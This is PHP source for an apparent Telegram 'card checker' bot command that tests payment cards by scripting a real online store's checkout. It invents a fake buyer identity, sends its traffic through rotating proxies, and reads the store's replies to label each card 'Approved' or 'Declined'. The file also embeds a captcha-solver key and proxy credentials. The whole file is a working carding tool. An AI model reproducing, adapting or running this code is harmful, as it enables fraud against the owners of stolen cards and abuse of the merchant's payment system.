<?php
list($cmd) = explode(" ", $message);
if($cmd == "/lk" or $cmd == ".lk" or $cmd == "!lk"){
$NameGater ='Payeezy';
$gateway = "/pz $NameGater";
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>$NameGater
Format: <code>cc|m|y|cvv</code></b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>ϟ CHECKING YOUR CARD
[ 🝂 WAIT A FEW SECONDS 🟥 ]
Gateway » $NameGater
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();
//////////////////////=[Proxy Section]=///////////////// 



#------[CURL-2]------#
bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ WAIT A FEW SECONDS 🟨 ]
Gateway » Lytos
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


//////////////////////////////=================[Join @TechHacksBySoham For More Stuff]=================/////////////////////////
if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}

if(strlen($mes) == 1){
    $mes = "0".$mes;
  }





$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];

$zip = $user["location"]["postcode"];

$areaCode = rand(201, 999);
$centralOfficeCode = rand(100, 999);
$lineNumber = rand(1000, 9999);

$phone = $areaCode . $centralOfficeCode . $lineNumber;
$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$curl = new CurlX;


$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos

$socks5 = "all.dc.smartproxy.com:10000";
$rotate = "Testingthis123:Testingpassword12+";




while ($retries < $maxRetries) {
    try { 
        $cookie = uniqid();
        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

        $headers = [
            'Accept: text/html, */*; q=0.01',
            'Accept-Language: es-ES,es;q=0.9',
            'Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://www.sewingmachinesplus.com',
            'Referer: https://www.sewingmachinesplus.com/aerofil-thread-8010.php',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'X-Requested-With: XMLHttpRequest',
        ];
        $data = '2152%3Aqnty=1&storeid=*1a55e44c50ad4a9e18c062cfd94a56&dbname=products&itemnum=2152&function=add&product_name_2152=Aerofil+Polyester+50wt.+thread%2C+440yds+-+White+-+8010&media_url_2152=https%3A%2F%2Fimagecdn.sewingmachinesplus.com%2Fmedia%2F&product_graphic_2152=products%2Fmadeira%2Fmadeira%2Faerofil-120_400m%2F8010-sm2.jpg';
        $req2 = $curl::Post('https://www.sewingmachinesplus.com/cgi-sewingmachinesplus/sb/order.cgi?storeid=*1a55e44c50ad4a9e18c062cfd94a56&amp;function=show', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer: https://www.sewingmachinesplus.com/aerofil-thread-8010.php',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        ];
        $req2 = $curl::Get('https://www.sewingmachinesplus.com/cgi-sewingmachinesplus/sb/order.cgi?storeid=*1a55e44c50ad4a9e18c062cfd94a56&function=show', $headers, $cookie, $server);
        echo $sbid = ($curl::ParseString($req2->body, 'var ss_sbid = "', '"'));
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language: es-ES,es;q=0.9',
            'Cache-Control: max-age=0',
            'Connection: keep-alive',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.sewingmachinesplus.com',
            'Referer: https://www.sewingmachinesplus.com/cgi-sewingmachinesplus/sb/order.cgi?storeid=*1a55e44c50ad4a9e18c062cfd94a56&function=show',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"'
        ];
        $data = 'sbid='.$sbid.'&storeid=*1a55e44c50ad4a9e18c062cfd94a56&fromid=order.cgi&j_script=10&rnd1=366903550&rnd2=1514935699&0%3Aqnty=1&smb=on&orderinst=&coupon_code=&giftcert_code=&giftcert_pin=&country=US&country_old=US&function=zip_code_changed&zip_code=10080&zip_code_old=&shipping=upsnone&tax=1&paytype=-1&reloadPos=';
        $req2 = $curl::Post('https://www.sewingmachinesplus.com/cgi-sewingmachinesplus/sb/order.cgi', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $shipping = ($curl::ParseString($req2->body, '<input checked  type="radio" name="shipping" id="', '"'));
        $rnd1 = ($curl::ParseString($req2->body, '<input type="hidden" name="rnd1" value="', '"'));
        $rnd2 = ($curl::ParseString($req2->body, '<input type="hidden" name="rnd2" value="', '"'));

        if ($shipping == "null" || $rnd1 == "null" ||$rnd2 == "null"  ) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }


        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.sewingmachinesplus.com',
            'Referer: https://www.sewingmachinesplus.com/cgi-sewingmachinesplus/sb/order.cgi',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        ];
        $data = 'sbid='.$sbid.'&storeid=*1a55e44c50ad4a9e18c062cfd94a56&fromid=order.cgi&j_script=10&rnd1='.$rnd1.'&rnd2='.$rnd2.'&0%3Aqnty=1&smb=on&orderinst=&coupon_code=&giftcert_code=&giftcert_pin=&country=US&country_old=US&zip_code=10080&zip_code_old=10080&shipping=api_1-3+Day+Delivery&tax=1&paytype=0&function=Checkout&reloadPos=';
        $req2 = $curl::Post('https://www.sewingmachinesplus.com/cgi-sewingmachinesplus/sb/order.cgi', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $WO8233 = ($curl::ParseString($req2->body, '<input type=hidden name="WO8233" value="', '"'));
        $rnd1 = ($curl::ParseString($req2->body, '<input type="hidden" name="rnd1" value="', '"'));
        $rnd2 = ($curl::ParseString($req2->body, '<input type="hidden" name="rnd2" value="', '"'));

        if ($WO8233 == "null" || $rnd1 == "null" ||$rnd2 == "null"  ) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.sewingmachinesplus.com',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"'
        ];
        $option = [
            '5' => '1',
            '4' => '0',
            '3' => '3',
            '6' => '2',

        ];
        $paytype = $option[substr($cc ,0,1)];

        $data = 'sbid='.$sbid.'&storeid=*1a55e44c50ad4a9e18c062cfd94a56&fromid=billing.cgi&WO8233='.$WO8233.'&j_script=10&frombilling=yes&rnd1='.$rnd1.'&rnd2='.$rnd2.'&Email='.urlencode($email).'&email_again='.urlencode($email).'&First='.$firstname.'&Last='.$lastname.'&Company=&Address=street+'.rand(111,6666).'&Address2=&City=New+York&State=NY&Zip=10080&Country=United+States&Phone='.$phone.'&usebilling=on&paytype='.$paytype.'&pay1='.$cc.'&cvv2='.$cvv.'&pay2='.$firstname.'+'.$lastname.'&pay3=&pay4_1='.$mes.'&pay4_2='.$ano.'&tax=1&email_list=on&field04=on&Comments=&function=Submit+Order';
        $req2 = $curl::Post('https://www.sewingmachinesplus.com/cgi-sewingmachinesplus/sb/thankyou.cgi', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }



        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
        $text = Textretries();
         bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
         return;

        }
    }
}

preg_match('/Detailed error message:\s*<br>\s*(.*?)<br/s', $req2->body, $matches);
$mgs = trim($matches[1]);


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}


bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ ALMOST FINISHED 🟩 ]
Gateway » $NameGater
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);



if(substr_count($req2->body, 'CVV2 Mismatch') || substr_count($req2->body, 'CVV mismatch')){
$status = "Approved ✅";
$response = "Address not Verified - Approved 🟩";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "Transaction Normal - Declined";
}


   
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card ⤿  <code>$cc|$mes|$ano|$cvv</code> 
Status ⤿  $status
Response ⤿ $response 
Gateway ⤿ $NameGater
──────────────────────
◈Country ⤿ <code>$country </code>$emoji 
◈Type ⤿ <code>$type</code> 
◈Level ⤿ <code>$scheme</code>
◈Vendor ⤿ <code>$brand</code>
◈Bank ⤿ <code>$bank </code> 
──────────────────────
Time ⤿  $tiempo s | retries $retries
@RitaaChk_Bot
Chk By ⤿ <a href='tg://user?id=$userId'>$username</a>[$Rank]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

?>